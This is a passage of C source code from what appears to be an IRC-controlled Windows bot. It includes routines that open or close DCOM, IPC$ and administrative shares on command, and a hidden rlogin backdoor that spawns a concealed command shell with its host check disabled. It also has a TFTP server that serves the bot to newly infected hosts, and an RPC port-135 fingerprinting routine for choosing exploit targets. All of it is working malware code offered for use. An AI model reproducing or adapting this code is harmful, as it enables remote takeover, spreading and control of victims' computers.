			TCHAR szDataBuf[]="N"; 
			if(fRegSetValueEx(hKey, "EnableDCOM", NULL, REG_SZ, (LPBYTE)szDataBuf, strlen(szDataBuf)) != ERROR_SUCCESS)
				sprintf(sendbuf,"8::[4SeCuRe8]:: Disable DCOM failed.");
			else
				sprintf(sendbuf,"8::[4SeCuRe8]:: DCOM disabled.");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"8::[4SeCuRe8]:: Failed to open DCOM registry key.");
		if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
		addlog(sendbuf);

		if (fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			DWORD dwData = 0x00000001;
			if (fRegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
				sprintf(sendbuf,"8::[4SeCuRe8]:: Failed to restrict access to the IPC$ Share.");
			else
				sprintf(sendbuf,"8::[4SeCuRe8]:: Restricted access to the IPC$ Share.");			
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"8::[4SeCuRe8]:: Failed to open IPC$ Restriction registry key.");
	} else
		sprintf(sendbuf,"8::[4SeCuRe8]:: Advapi32.dll couldn't be loaded.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
	addlog(sendbuf);

	if (!nonetapi32) {
		PSHARE_INFO_502 pBuf,p;
		NET_API_STATUS nStatus;
		DWORD entriesread=0,totalread=0,resume=0;
 
		do {
			nStatus = fNetShareEnum(NULL, 502, (LPBYTE *) &pBuf, -1, &entriesread, &totalread, &resume);

			if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA) {
				p = pBuf;
 
				for(unsigned int i=1;i <= entriesread;i++) {
					if (p->shi502_netname[wcslen(p->shi502_netname)-1] == '$') {
						if(ShareDel(NULL,AsAnsiString(p->shi502_netname)) == NERR_Success)
							_snprintf(sendbuf,sizeof(sendbuf),"8::[4SeCuRe8]:: Share '%S' deleted.",p->shi502_netname);
						else 
							_snprintf(sendbuf,sizeof(sendbuf),"8::[4SeCuRe8]:: Failed to delete '%S' share.",p->shi502_netname);
						if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
						addlog(sendbuf);
					}

					p++;
				}

				fNetApiBufferFree(pBuf);
			} else {
				for(int i=0;i < (sizeof(ShareList) / sizeof (NetShares));i++) { 
					if(ShareDel(NULL,ShareList[i].ShareName) == NERR_Success)
						_snprintf(sendbuf,sizeof(sendbuf),"8::[4SeCuRe8]:: Share '%s' deleted.",ShareList[i].ShareName);
					else 
						_snprintf(sendbuf,sizeof(sendbuf),"8::[4SeCuRe8]:: Failed to delete '%s' share.",ShareList[i].ShareName);
					if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
					addlog(sendbuf);
				} 
			}
		} while (nStatus == ERROR_MORE_DATA);	
		sprintf(sendbuf,"8::[4SeCuRe8]:: Network shares deleted.");
	} else
		sprintf(sendbuf,"8::[4SeCuRe8]:: Netapi32.dll couldn't be loaded.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);

	return TRUE;
}

BOOL UnSecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	if (!noadvapi32) {
		HKEY hKey; 
		if(fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey3, 0, KEY_READ|KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			TCHAR szDataBuf[]="Y"; 
			if(fRegSetValueEx(hKey, "EnableDCOM", NULL, REG_SZ, (LPBYTE)szDataBuf, strlen(szDataBuf)) != ERROR_SUCCESS)
				sprintf(sendbuf,"8::[4SeCuRe8]:: Enable DCOM failed.");
			else
				sprintf(sendbuf,"8::[4SeCuRe8]:: DCOM enabled.");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"8::[4SeCuRe8]:: Failed to open DCOM registry key.");
		if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
		addlog(sendbuf);

		if (fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			DWORD dwData = 0x00000000;
			if (fRegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
				sprintf(sendbuf,"8::[4SeCuRe8]:: Failed to unrestrict access to the IPC$ Share.");
			else
				sprintf(sendbuf,"8::[4SeCuRe8]:: Unrestricted access to the IPC$ Share.");			
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"8::[4SeCuRe8]:: Failed to open IPC$ restriction registry key.");
	} else
		sprintf(sendbuf,"8::[4SeCuRe8]:: Advapi32.dll couldn't be loaded.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
	addlog(sendbuf);

	if (!nonetapi32) {
		for(int i=0;i < ((sizeof(ShareList) / sizeof (NetShares)) - 2);i++) { 
			if(ShareAdd(NULL,ShareList[i].ShareName,ShareList[i].SharePath) == NERR_Success)
				_snprintf(sendbuf,sizeof(sendbuf),"8::[4SeCuRe8]:: Share '%s' added.",ShareList[i].ShareName);
			else 
				_snprintf(sendbuf,sizeof(sendbuf),"8::[4SeCuRe8]:: Failed to add '%s' share.",ShareList[i].ShareName);
			if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
			addlog(sendbuf);
		}

		char sharename[10], sharepath[10];
		DWORD dwDrives = GetLogicalDrives();
		for(char cDrive='A'; dwDrives!=0; cDrive++, dwDrives=(dwDrives>>1)) {
			if((dwDrives & 1)==1 && cDrive != 'A') {
				_snprintf(sharename,sizeof(sharename),"%c$",cDrive);
				_snprintf(sharepath,sizeof(sharepath),"%c:\\",cDrive);

				if (fGetDriveType(sharepath) == DRIVE_FIXED) {
					if(ShareAdd(NULL,sharename,sharepath) == NERR_Success)
						_snprintf(sendbuf,sizeof(sendbuf),"8::[4SeCuRe8]:: Share '%s' added.",sharename);
					else 
						_snprintf(sendbuf,sizeof(sendbuf),"8::[4SeCuRe8]:: Failed to add '%s' share.",sharename);
					if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
					addlog(sendbuf);
				}
			}
		}

		sprintf(sendbuf,"8::[4SeCuRe8]:: Network shares added.");
	} else
		sprintf(sendbuf,"8::[4SeCuRe8]:: Netapi32.dll couldn't be loaded.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);

	return TRUE;
}

#ifndef NO_SECSYSTEM
DWORD WINAPI AutoSecure(LPVOID param)
{
	while (1) {
		SecureSystem(0,NULL,FALSE,TRUE);
		Sleep(secure_delay);
	}
	ExitThread (0);
}
#endif

#ifndef NO_RLOGIND

BOOL DebugFlag = FALSE;
BOOL InsecureFlag = FALSE;
BOOL LogFlag = FALSE;

static BOOL GetStr(SOCKET Socket, char *buffer, int cnt)
{
	char c;
    
	do {
		if (frecv(Socket, &c, 1, 0) != 1)
			return (FALSE);
		*buffer++ = c;
		if (--cnt == 0) {
			addlogv("8::[4RlOgIn8]:: Protocol string too long.");
			return (FALSE);
		}
	} while (c != 0);

	return (TRUE);
}

static BOOL CtrlHandler(DWORD CtrlType)
{
	return (CtrlType == CTRL_C_EVENT);
}

static BOOL CheckLogin(char *RemoteUser, char *RemoteHost, char *LocalUser, unsigned long ClientAddr)
{
	// LPHOSTENT HostEnt;
	// BYTE HostName[100];
	BOOL HostOk = FALSE;

	if (strcmp(LocalUser, RemoteUser) != 0) {
		addlogv("8::[4RlOgIn8]:: Login rejected, Remote user: <%s@%s>.", RemoteUser, RemoteHost);
		return (FALSE);
	}

	// FIX ME: need to add in a real hostcheck.
	/*
	if ((HostEnt = gethostbyname(HostName)) != NULL) 
		if (ClientAddr == *(unsigned long *)HostEnt->h_addr) {
			HostOk = TRUE;
			break;
		}
	}
	*/

	HostOk=TRUE;
	if (!HostOk) 
		addlogv("8::[4RlOgIn8]:: Login rejected, Remote user: <%s@%s>.", RemoteUser, RemoteHost);

	return HostOk;
}

DWORD WINAPI RlogindClientThread(LPVOID param)
{
	RLOGIND rlogind = *((RLOGIND *)param);
	RLOGIND *rloginds = (RLOGIND *)param;
	rloginds->gotinfo = TRUE;	

	int threadnum=rlogind.cthreadnum;
	
	char LocalUser[16], RemoteUser[16], TerminalType[64], HostName[100], Buffer[16];
	LPHOSTENT HostEnt;
	SOCKADDR_IN csin;

	TIMEVAL timeout;
	timeout.tv_sec = 30;
	timeout.tv_usec = 0;
	fd_set fd;
	FD_ZERO(&fd);
	FD_SET(threads[threadnum].sock, &fd);

	if (fselect(0, &fd, NULL, NULL, &timeout) == 0) {
		fclosesocket(threads[threadnum].sock);
		clearthread(threadnum);
		ExitThread(0);
	}

	frecv(threads[threadnum].sock, (char *)&Buffer, 1, 0);

	GetStr(threads[threadnum].sock, RemoteUser, sizeof(RemoteUser));
	GetStr(threads[threadnum].sock, LocalUser, sizeof(LocalUser));
	GetStr(threads[threadnum].sock, TerminalType, sizeof(TerminalType));

	int csin_len = sizeof(csin);
	if (fgetpeername(threads[threadnum].sock, (LPSOCKADDR) &csin, &csin_len) != 0) {
		addlogv("8::[4RlOgIn8]:: Error: getpeername(): <%d>.", fWSAGetLastError());
		clearthread(threadnum);
		ExitThread(0);
	}

	if ((HostEnt = fgethostbyaddr((char *)&csin.sin_addr, sizeof(csin.sin_addr), PF_INET)) == NULL) 
		sprintf(HostName, finet_ntoa(csin.sin_addr));
	else
		strcpy(HostName, HostEnt->h_name);

	fsend(threads[threadnum].sock, "", 1, 0);

	if (!InsecureFlag && !CheckLogin(RemoteUser,HostName,rlogind.username,csin.sin_addr.s_addr)) {
		fsend(threads[threadnum].sock, PERMISSION_DENIED_MSG, sizeof PERMISSION_DENIED_MSG, 0);
		fclosesocket(threads[threadnum].sock);
		clearthread(threadnum);
		ExitThread(0);
	}

	addlogv("8::[4RlOgIn8]:: User logged in: <%s@%s>.", RemoteUser, HostName);

	if (! SessionRun(threadnum)) {
		addlogv("8::[4RlOgIn8]:: Error: SessionRun(): <%d>.", GetLastError());
		clearthread(threadnum);
		ExitThread(1);
	}

	addlogv("8::[4RlOgIn8]:: User logged out: <%s@%s>.", RemoteUser, HostName);

	clearthread(threadnum);
	ExitThread(0);
}

DWORD WINAPI RlogindThread(LPVOID param)
{
	RLOGIND rlogind = *((RLOGIND *)param);
	RLOGIND *rloginds = (RLOGIND *)param;
	rloginds->gotinfo = TRUE;

	char sendbuf[IRCLINE];

    int csin_len, Err;
	unsigned long mode = 1;

	WSADATA WSAData;
    SECURITY_ATTRIBUTES SecurityAttributes;
    DWORD id;

	if ((Err = fWSAStartup(MAKEWORD(2,2), &WSAData)) != 0) {
		addlogv("8::[4RlOgIn8]:: Error: WSAStartup(): <%d>.", Err);
		clearthread(rlogind.threadnum);
		ExitThread(1);
	}    
	if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE)&CtrlHandler, TRUE)) {
		addlogv("8::[4RlOgIn8]:: Failed to install control-C handler, error: <%d>.", GetLastError());
		fWSACleanup();
		clearthread(rlogind.threadnum);
		ExitThread(1);
	}

	SOCKET ssock, csock;
    SOCKADDR_IN csin, ssin;
	memset(&ssin, 0, sizeof(ssin));	
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)rlogind.port);
	ssin.sin_addr.s_addr = INADDR_ANY;	

	if ((ssock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		threads[rlogind.threadnum].sock = ssock;
		if (fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) == 0) {
			if (flisten(ssock, SOMAXCONN) == 0) {
				SecurityAttributes.nLength = sizeof(SecurityAttributes);
				SecurityAttributes.lpSecurityDescriptor = NULL;
				SecurityAttributes.bInheritHandle = FALSE;

				addlog("8::[4RlOgIn8]:: Ready and waiting for incoming connections.");

				BOOL flag = TRUE;
				while (1) {
					csin_len = sizeof(csin);
					if ((csock = faccept(ssock, (LPSOCKADDR)&csin, &csin_len)) == INVALID_SOCKET)
						break;

					if (fsetsockopt(csock, SOL_SOCKET, SO_KEEPALIVE,(char *)&flag,flag) != SOCKET_ERROR) {
						rlogind.gotinfo = FALSE;
						sprintf(sendbuf,"8::[4RlOgIn8]:: Client connection from IP: %s:%d, Server thread: %d.", finet_ntoa(csin.sin_addr), csin.sin_port, rlogind.threadnum);
						addlog(sendbuf);
						rlogind.cthreadnum = addthread(sendbuf,RLOGIN_THREAD,csock);
						threads[rlogind.cthreadnum].parent = rlogind.threadnum;
						if (threads[rlogind.cthreadnum].tHandle = CreateThread(&SecurityAttributes,0,&RlogindClientThread,(LPVOID)&rlogind,0,&id)) {
							while (rlogind.gotinfo == FALSE) 
								Sleep(50);
						} else {
							addlogv("8::[4RlOgIn8]:: Failed to start client thread, error: <%d>.", GetLastError());
							break;
						}
					}
				}
			}
		}
	}

	sprintf(sendbuf, "8::[4RlOgIn8]:: Error: server failed, returned: <%d>.", fWSAGetLastError());
	if (!rlogind.silent) irc_privmsg(rlogind.sock, rlogind.chan, sendbuf, rlogind.notice);
	addlog(sendbuf);
	
	fclosesocket(csock);
	fclosesocket(ssock);
	fWSACleanup();

	clearthread(rlogind.threadnum);

	ExitThread(0);
}
#endif

#ifndef NO_TFTPD

DWORD WINAPI tftpserver(LPVOID param) 
{ 
	FILE *fp;

	char sendbuf[IRCLINE], buffer[128], type[]="octet", IP[18];
	int err=1; 

	TFTP tftp = *((TFTP *)param);
	TFTP *tftps = (TFTP *)param;
	tftps->gotinfo = TRUE;
	tftp.threads++; 

	SOCKET ssock;
	if ((ssock=fsocket(AF_INET,SOCK_DGRAM,0)) == INVALID_SOCKET) {
		Sleep(400);
		sprintf(sendbuf,"8::[4TfTp8]:: Error: socket() failed, returned: <15 %d 1>.", fWSAGetLastError());
		if (!tftp.silent) irc_privmsg(tftp.sock,tftp.chan,sendbuf,tftp.notice);
		addlog(sendbuf);

		clearthread(tftp.threadnum);

		ExitThread(0);
	}
	threads[tftp.threadnum].sock=ssock;

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET; 
	ssin.sin_port = fhtons((unsigned short)tftp.port); 
	ssin.sin_addr.s_addr = INADDR_ANY; 

	if((fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin))) == SOCKET_ERROR) { 
		Sleep(5000); 
		tftp.threads--; 

		return tftpserver(param); 
	} 

	if ((fp=fopen(tftp.filename, "rb")) == NULL) {
		Sleep(400);
		sprintf(sendbuf,"8::[4TfTp8]:: Failed to open file: [15 %s 8].",tftp.filename);
		irc_privmsg(tftp.sock,tftp.chan,sendbuf,tftp.notice);
		addlog(sendbuf);

		clearthread(tftp.threadnum);

		ExitThread(0);
	}

	while(err>0 && tftps->gotinfo && fp) { 
		TIMEVAL timeout; 
		timeout.tv_sec=5; 
		timeout.tv_usec=5000; 

		fd_set fd; 
		FD_ZERO(&fd); 
		FD_SET(ssock,&fd); 

		memset(buffer,0,sizeof(buffer)); 
		if(fselect(0,&fd,NULL,NULL,&timeout) > 0) { 
			SOCKADDR_IN csin;
			int csin_len=sizeof(csin); 
			char f_buffer[BLOCKSIZE+4]=""; 
			
			err=frecvfrom(ssock, buffer, sizeof(buffer), 0, (LPSOCKADDR)&csin, &csin_len); 
			sprintf(IP,finet_ntoa(csin.sin_addr));
        
			// parse buffer
			if(buffer[0]==0 && buffer[1]==1) { //RRQ
				char *tmprequest=buffer,*tmptype=buffer;
				tmprequest+=2; //skip the opcode
				tmptype+=(strlen(tftp.requestname)+3); //skip the opcode and request name + NULL
				if(strncmp(tftp.requestname,tmprequest,strlen(tftp.requestname)) != 0||strncmp(type,tmptype,strlen(type)) != 0) { 
					fsendto(ssock, "\x00\x05\x00\x01\x46\x69\x6C\x65\x20\x4E\x6F\x74\x20\x46\x6F\x75\x6E\x64\x00", 19, 0, (LPSOCKADDR)&csin,csin_len);
					// for loop to add a \0 to the end of the requestname
					sprintf(buffer,"8::[4TfTp8]:: File not found: [15 %s 8] (%s).",IP,tftp.requestname);
					addlog(buffer);
				} else { // good rrq packet send first data packet 
					fseek(fp, 0, SEEK_SET); 
					f_buffer[0]=0; f_buffer[1]=3; // DATA
					f_buffer[2]=0; f_buffer[3]=1; // DATA BLOCK #
					err=fread(&f_buffer[4], 1, BLOCKSIZE, fp); 
					fsendto(ssock, f_buffer, err + 4, 0, (LPSOCKADDR)&csin, csin_len);

					sprintf(sendbuf,"8::[4TfTp8]:: Transfer Started On 8::[15 %s 8]:: Sending ::(15 %s 1)::",IP,filename);
					if (!tftp.silent) irc_privmsg(tftp.sock,tftp.chan,sendbuf,tftp.notice);
					addlog(sendbuf);
				} 
			} else if(buffer[0]==0 && buffer[1]==4) { // ACK 
				// send next packet 
				unsigned int blocks; 
				BYTE b1=buffer[2],b2=buffer[3]; // ACK BLOCK #

				f_buffer[0]=0; f_buffer[1]=3;	// DATA
				if (b2==255) {					// DATA BLOCK #
					f_buffer[2]=++b1;
					f_buffer[3]=b2=0;
				} else {
					f_buffer[2]=b1;
					f_buffer[3]=++b2;
				}

				blocks=(b1 * 256) + b2 - 1; 
				// remember to subtract 1 as the ACK block # is 1 more than the actual file block #
				fseek(fp, blocks * BLOCKSIZE, SEEK_SET); 
				err=fread(&f_buffer[4], 1, BLOCKSIZE, fp); 
				fsendto(ssock, f_buffer, err + 4, 0, (LPSOCKADDR)&csin, csin_len);
				if (err==0) {
					sprintf(sendbuf,"8::[4TfTp8]:: Transfer Complete On 8::[4 %s 8]:: Executing ::(4 %s 1)::",IP,filename);
					if (!tftp.silent) irc_privmsg(tftp.sock,tftp.chan,sendbuf,tftp.notice);
					addlog(sendbuf);
				}
			} else { // we dont support any other commands 
				fsendto(ssock, "\x00\x05\x00\x04\x6B\x74\x68\x78\x00",9, 0, (LPSOCKADDR)&csin, csin_len); 
			} 
		} else 
			continue;
	} 
	// check for ack, then msg irc on transfer complete

	fclosesocket(ssock); 
	fclose(fp); 

	tftp.threads--; 
	if(tftps->gotinfo == FALSE) {
		clearthread(tftp.threadnum);

		ExitThread(0); 
	}
	Sleep(1000);
   
	return tftpserver(param); 
} 
#endif

#ifndef NO_RLOGIND

static PSESSION_DATA CreateSession(int threadnum)
{
	PSESSION_DATA Session = NULL;
	BOOL Result;
	SECURITY_ATTRIBUTES SecurityAttributes;
	HANDLE ShellStdinPipe = NULL, ShellStdoutPipe = NULL;

	if ((Session = (PSESSION_DATA)malloc(sizeof(SESSION_DATA))) == NULL)
		return (NULL);

	Session->ReadPipeHandle = NULL;
	Session->WritePipeHandle = NULL;

	SecurityAttributes.nLength = sizeof(SecurityAttributes);
	SecurityAttributes.lpSecurityDescriptor = NULL;
	SecurityAttributes.bInheritHandle = TRUE;

	if ((Result = CreatePipe(&Session->ReadPipeHandle,&ShellStdoutPipe,&SecurityAttributes,0)) == FALSE) {
		addlogv("8::[4RlOgInD8]:: Failed to create shell stdout pipe, error: <%d>.", GetLastError());
		goto Failure;
	}
	if ((Result = CreatePipe(&ShellStdinPipe,&Session->WritePipeHandle,&SecurityAttributes,0)) == FALSE) {
		addlogv("8::[4RlOgInD8]:: Failed to create shell stdin pipe, error: <%d>.", GetLastError());
		goto Failure;
	}

	Session->ProcessHandle = StartShell(ShellStdinPipe, ShellStdoutPipe, threadnum);

	CloseHandle(ShellStdinPipe);
	CloseHandle(ShellStdoutPipe);

	if (Session->ProcessHandle == NULL) {
		addlog("8::[4RlOgInD8]:: Failed to execute shell.");
		goto Failure;
	}

	Session->ClientSocket = INVALID_SOCKET;

	return (Session);

	Failure:

	if (ShellStdinPipe != NULL) 
		CloseHandle(ShellStdinPipe);
	if (ShellStdoutPipe != NULL) 
		CloseHandle(ShellStdoutPipe);
	if (Session->ReadPipeHandle != NULL) 
		CloseHandle(Session->ReadPipeHandle);
	if (Session->WritePipeHandle != NULL) 
		CloseHandle(Session->WritePipeHandle);

	free(Session);

	return (NULL);
}

BOOL SessionRun(int threadnum)
{
	PSESSION_DATA Session = CreateSession(threadnum);
	SECURITY_ATTRIBUTES SecurityAttributes;
	DWORD ThreadId;
	HANDLE HandleArray[3];

	assert(threads[threadnum].sock != INVALID_SOCKET);

	SecurityAttributes.nLength = sizeof(SecurityAttributes);
	SecurityAttributes.lpSecurityDescriptor = NULL;
	SecurityAttributes.bInheritHandle = FALSE;

	Session->ClientSocket = threads[threadnum].sock;

	if ((Session->ReadShellThreadHandle = CreateThread(&SecurityAttributes,0,
		(LPTHREAD_START_ROUTINE)SessionReadShellThread,(LPVOID)Session,0,&ThreadId)) == NULL) {
		addlogv("8::[4RlOgInD8]:: Failed to create ReadShell session thread, error: <%d>.", GetLastError());
		Session->ClientSocket = INVALID_SOCKET;

		return(FALSE);
	}

	if ((Session->WriteShellThreadHandle = CreateThread(&SecurityAttributes,0,
		(LPTHREAD_START_ROUTINE)SessionWriteShellThread,(LPVOID)Session,0,&ThreadId)) == NULL) {
		addlogv("8::[4RlOgInD8]:: Failed to create ReadShell session thread, error: <%d>.", GetLastError());
		Session->ClientSocket = INVALID_SOCKET;

		TerminateThread(Session->WriteShellThreadHandle, 0);
		return(FALSE);
	}

	HandleArray[0] = Session->ReadShellThreadHandle;
    HandleArray[1] = Session->WriteShellThreadHandle;
    HandleArray[2] = Session->ProcessHandle;

	switch (WaitForMultipleObjects(3, HandleArray, FALSE, 0xffffffff)) {
	case WAIT_OBJECT_0 + 0:
		TerminateThread(Session->WriteShellThreadHandle, 0);
		TerminateProcess(Session->ProcessHandle, 1);
		break;

	case WAIT_OBJECT_0 + 1:
		TerminateThread(Session->ReadShellThreadHandle, 0);
		TerminateProcess(Session->ProcessHandle, 1);
		break;

	case WAIT_OBJECT_0 + 2:
		TerminateThread(Session->WriteShellThreadHandle, 0);
		TerminateThread(Session->ReadShellThreadHandle, 0);
		break;

	default:
		addlogv("8::[4RlOgInD8]:: WaitForMultipleObjects error: <%d>.", GetLastError());
		break;
	}

	CloseHandle(Session->ReadShellThreadHandle);
	CloseHandle(Session->WriteShellThreadHandle);
	CloseHandle(Session->ProcessHandle);
	CloseHandle(Session->ReadPipeHandle);
	CloseHandle(Session->WritePipeHandle);

	fclosesocket(Session->ClientSocket);

	free(Session);

	return(TRUE);
}

static HANDLE StartShell(HANDLE ShellStdinPipeHandle, HANDLE ShellStdoutPipeHandle, int threadnum)
{
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	HANDLE ProcessHandle = NULL;

	memset(&sinfo, 0, sizeof(sinfo));
	memset(&pinfo, 0, sizeof(pinfo)); 

	sinfo.lpTitle = NULL;
	sinfo.cb = sizeof(STARTUPINFO);
	sinfo.lpReserved = NULL;
	sinfo.lpTitle = NULL;
	sinfo.lpDesktop = NULL;
	sinfo.dwX = sinfo.dwY = sinfo.dwXSize = sinfo.dwYSize = 0L;
	sinfo.wShowWindow = SW_HIDE;
	sinfo.lpReserved2 = NULL;
	sinfo.cbReserved2 = 0;
	sinfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	sinfo.hStdInput = ShellStdinPipeHandle;
	sinfo.hStdOutput = ShellStdoutPipeHandle;

	DuplicateHandle(GetCurrentProcess(),ShellStdoutPipeHandle,
		GetCurrentProcess(),&sinfo.hStdError,DUPLICATE_SAME_ACCESS,TRUE,0);

    if (CreateProcess(NULL,SHELL_COMMAND_LINE,NULL,NULL,TRUE,0,NULL,NULL,&sinfo,&pinfo)) {
		ProcessHandle = pinfo.hProcess;
		threads[threadnum].pid = pinfo.dwProcessId;
		CloseHandle(pinfo.hThread);
    } else 
		addlogv("8::[4RlOgInD8]:: Failed to execute shell, error: <%d>.", GetLastError());

	return(ProcessHandle);
}

static void SessionReadShellThread(LPVOID param)
{
	PSESSION_DATA Session = (PSESSION_DATA)param;
	char Buffer[BUFFER_SIZE], Buffer2[BUFFER_SIZE+30];
	DWORD BytesRead;

	while (ReadFile(Session->ReadPipeHandle, Buffer, sizeof(Buffer), &BytesRead, NULL)) {
		DWORD BufferCnt, BytesToWrite;
		BYTE PrevChar = 0;

		for (BufferCnt = 0, BytesToWrite = 0; BufferCnt < BytesRead; BufferCnt++) {
			if (Buffer[BufferCnt] == '\n' && PrevChar != '\r')
				Buffer2[BytesToWrite++] = '\r';
			PrevChar = Buffer2[BytesToWrite++] = Buffer[BufferCnt];
			assert(BytesToWrite < sizeof Buffer2);
		}

		if (fsend(Session->ClientSocket, Buffer2, BytesToWrite, 0) <= 0) 
			break;
	}

	if (GetLastError() != ERROR_BROKEN_PIPE)
		addlogv("8::[4RlOgInD8]:: SessionReadShellThread exited, error: <%ld>.", GetLastError());

	return;
}

static void SessionWriteShellThread(LPVOID param)
{
	PSESSION_DATA Session = (PSESSION_DATA)param;
	char RecvBuffer[1], Buffer[BUFFER_SIZE], EchoBuffer[5];
	DWORD BytesWritten, BufferCnt = 0, EchoCnt, TossCnt = 0;
	BOOL PrevWasFF = FALSE;

	while (frecv(Session->ClientSocket, RecvBuffer, sizeof(RecvBuffer), 0) > 0) {
		if (TossCnt > 0) {
			TossCnt -= 1;
			continue;
		}

		if (RecvBuffer[0] != 0xff)
			PrevWasFF = FALSE;
		else {
			if (! PrevWasFF) 
				PrevWasFF = TRUE;
			else {
				TossCnt = 10;
				PrevWasFF = FALSE;
			}
			continue;
		}

		EchoCnt = 0;
		if (RecvBuffer[0] == CHAR_BS || RecvBuffer[0] == CHAR_DEL) {
			if (BufferCnt > 0) {
				BufferCnt -= 1;
				EchoBuffer[EchoCnt++] = CHAR_BS;
				EchoBuffer[EchoCnt++] = ' ';
				EchoBuffer[EchoCnt++] = CHAR_BS;
			}
		} else if (RecvBuffer[0] == CHAR_CTRL_C) {
			GenerateConsoleCtrlEvent(CTRL_C_EVENT, 0);
		} else if (RecvBuffer[0] == CHAR_CTRL_U) {
			BufferCnt = 0;
			EchoBuffer[EchoCnt++] = ' ';
			EchoBuffer[EchoCnt++] = 'X';
			EchoBuffer[EchoCnt++] = 'X';
			EchoBuffer[EchoCnt++] = 'X';
			EchoBuffer[EchoCnt++] = '\r';
			EchoBuffer[EchoCnt++] = '\n';
		} else {
			Buffer[BufferCnt++] = EchoBuffer[EchoCnt++] = RecvBuffer[0];
			if (RecvBuffer[0] == '\r')
				Buffer[BufferCnt++] = EchoBuffer[EchoCnt++] = '\n';
		}

		if (EchoCnt > 0 && fsend(Session->ClientSocket, EchoBuffer, EchoCnt, 0) <= 0) 
			break;
        
		if (RecvBuffer[0] == '\r') {
			if (! WriteFile(Session->WritePipeHandle, Buffer, BufferCnt, &BytesWritten, NULL))
				break;
			BufferCnt = 0;
		}
	}

	return;
}
#endif

char rpcfp_bindstr[]=
"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
"\x80\xbd\xa8\xaf\x8a\x7d\xc9\x11\xbe\xf4\x08\x00\x2b\x10\x29\x89"
"\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
"\x2b\x10\x48\x60\x02\x00\x00\x00";

char rpcfp_inqifids[]=
"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00";

char w2kuuid_sig[]=
"\xB0\x01\x52\x97\xCA\x59\xD0\x11\xA8\xD5\x00\xA0\xC9\x0D\x80\x51";

char wxpuuid_sig[]=
"\x26\xB5\x55\x1D\x37\xC1\xC5\x46\xAB\x79\x63\x8F\x2A\x68\xE8\x69";


bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen)
{
	for(int i=0;i<iMemLen-iSearchLen;i++)
		if(!memcmp(pMem+i, pSearch, iSearchLen))
			return true;

	return false;
}

int FpHost(const char *szHost, int iFpType)
{
	switch(iFpType) {
	case FP_RPC:
		{
			char szRecvBuf[8192];
	    
			int iRetVal=OS_UNKNOWN;
			int sSocket=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	    
			if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET) 
				return OS_UNKNOWN;
	    
			SOCKADDR_IN ssin; 
			memset(&ssin, 0, sizeof(ssin)); 
			ssin.sin_family=AF_INET;
			ssin.sin_port=fhtons(135); 
			ssin.sin_addr.s_addr=ResolveAddress((char *)szHost);
	    
			int iErr=fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
			if(iErr!=SOCKET_ERROR) {	
				iErr=fsend(sSocket, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				if(szRecvBuf[2]==DCE_PKT_BINDACK) {	
					iErr=fsend(sSocket, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1,0);
					if(iErr==SOCKET_ERROR) { 
						fclosesocket(sSocket); 
						return iRetVal; 
					}
					iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf),0);
					if(iErr==SOCKET_ERROR) { 
						fclosesocket(sSocket); 
						return iRetVal; 
					}
					if(szRecvBuf[2]==DCE_PKT_RESPONSE) {	
						if(MemContains(szRecvBuf, iErr, w2kuuid_sig, sizeof(w2kuuid_sig)-1)) {	
							if(iErr<300) 
								iRetVal=OS_WINNT; 
